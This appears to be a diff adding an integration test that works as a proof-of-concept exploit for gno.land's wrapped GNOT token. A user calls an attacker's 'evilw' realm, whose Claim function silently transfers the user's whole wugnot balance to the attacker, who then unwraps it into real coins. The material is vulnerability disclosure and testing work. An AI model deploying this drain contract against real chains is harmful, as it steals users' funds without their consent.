@@ -1,0 +1,83 @@
+# wugnot exports its *Token and registers it, so a public UserTeller() makes
+# every holder's wrapped GNOT spendable by any realm they call directly. The
+# attacker moves it to an account it controls and unwraps it into real ugnot.
+# Measured at 16f54a89c: alice wraps 5000000ugnot, signs `evilw.Claim()` with no
+# arguments, and mallory withdraws 5000000ugnot she never authorized.
+#
+# Run: from a local clone of gnolang/gno:
+# gh pr checkout 6123 -R gnolang/gno
+# cp grc20_userteller_wugnot_theft.txtar gno.land/pkg/integration/testdata/
+# go test -v -run 'TestTestdata/grc20_userteller_wugnot_theft' ./gno.land/pkg/integration/
+# rm gno.land/pkg/integration/testdata/grc20_userteller_wugnot_theft.txtar
+
+loadpkg gno.land/r/gnoland/wugnot
+loadpkg gno.land/r/test/evilw $WORK/evilw
+
+adduser alice
+adduser mallory
+
+gnoland start
+
+gnokey maketx send -send 50000000ugnot -to $alice_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid tendermint_test test1
+stdout 'OK!'
+gnokey maketx send -send 50000000ugnot -to $mallory_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid tendermint_test test1
+stdout 'OK!'
+
+# alice wraps 5000000ugnot.
+gnokey maketx call -pkgpath gno.land/r/gnoland/wugnot -func Deposit -send 5000000ugnot -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
+stdout OK
+gnokey query vm/qeval --data "gno.land/r/gnoland/wugnot.BalanceOf(\"$alice_user_addr\")"
+stdout '5000000 int64'
+
+# mallory names herself the beneficiary of her own realm.
+gnokey maketx call -pkgpath gno.land/r/test/evilw -func Arm -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test mallory
+stdout OK
+gnokey query bank/balances/$mallory_user_addr
+stdout '1048992600ugnot'
+
+# alice signs one MsgCall: pkgpath gno.land/r/test/evilw, func Claim, no
+# arguments. evilw has no allowance and no relationship with wugnot.
+gnokey maketx call -pkgpath gno.land/r/test/evilw -func Claim -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
+stdout OK
+
+gnokey query vm/qeval --data "gno.land/r/gnoland/wugnot.BalanceOf(\"$alice_user_addr\")"
+stdout '0 int64'         # IS:     a realm alice merely called moved her whole wrapped balance
+# stdout '5000000 int64' # SHOULD: wrapped GNOT moves only on a write its holder named
+gnokey query vm/qeval --data "gno.land/r/gnoland/wugnot.BalanceOf(\"$mallory_user_addr\")"
+stdout '5000000 int64'
+
+# mallory unwraps into real ugnot she never had a claim on: 4102800ugnot up,
+# the 5000000 unwrapped less the 1000000 gas fee plus a 102800 storage refund.
+gnokey maketx call -pkgpath gno.land/r/gnoland/wugnot -func Withdraw -args 5000000 -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test mallory
+stdout OK
+gnokey query bank/balances/$mallory_user_addr
+stdout '1053095400ugnot'
+
+-- evilw/gnomod.toml --
+module = "gno.land/r/test/evilw"
+gno = "0.9"
+
+-- evilw/evilw.gno --
+package evilw
+
+import "gno.land/r/demo/defi/grc20reg"
+
+const key = "gno.land/r/gnoland/wugnot.wugnot"
+
+var beneficiary address
+
+func Arm(cur realm) {
+	beneficiary = cur.Previous().Address()
+}
+
+// Claim shows the signer "evilw.Claim()" and nothing else.
+func Claim(cur realm) {
+	tok := grc20reg.MustGet(key)
+	bal := tok.BalanceOf(cur.Previous().Address())
+	if bal == 0 {
+		return
+	}
+	if err := tok.UserTeller().Transfer(0, cur, beneficiary, bal); err != nil {
+		panic(err)
+	}
+}
